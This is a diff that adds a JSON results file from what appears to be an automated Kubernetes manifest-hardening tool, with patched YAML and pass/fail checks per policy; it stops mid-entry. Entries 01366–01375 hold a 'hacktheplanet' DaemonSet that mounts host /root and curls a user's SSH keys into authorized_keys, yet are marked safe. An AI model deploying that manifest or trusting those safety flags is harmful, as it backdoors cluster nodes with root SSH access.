@@ -1,0 +1,458 @@
+[
+  {
+    "id": "01361",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
+    "errors": []
+  },
+  {
+    "id": "01362",
+    "policy_id": "read_only_root_fs",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": false,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "no containers found in manifest",
+      "kubectl dry-run failed"
+    ]
+  },
+  {
+    "id": "01363",
+    "policy_id": "run_as_non_root",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": false,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "no containers found in manifest",
+      "kubectl dry-run failed"
+    ]
+  },
+  {
+    "id": "01364",
+    "policy_id": "set_requests_limits",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": false,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "no containers found in manifest",
+      "kubectl dry-run failed"
+    ]
+  },
+  {
+    "id": "01365",
+    "policy_id": "set_requests_limits",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": false,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "no containers found in manifest",
+      "kubectl dry-run failed"
+    ]
+  },
+  {
+    "id": "01366",
+    "policy_id": "no_latest_tag",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01367",
+    "policy_id": "no_latest_tag",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01368",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01369",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01370",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01371",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01372",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01373",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01374",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01375",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01376",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01377",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01378",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01379",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01380",
+    "policy_id": "no_latest_tag",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01381",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01382",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01383",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01384",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01385",
+    "policy_id": "read_only_root_fs",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "kubectl dry-run failed"
+    ]
+  },
+  {
+    "id": "01386",
+    "policy_id": "no_latest_tag",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01387",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01388",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01389",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01390",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01391",
+    "policy_id": "no_latest_tag",
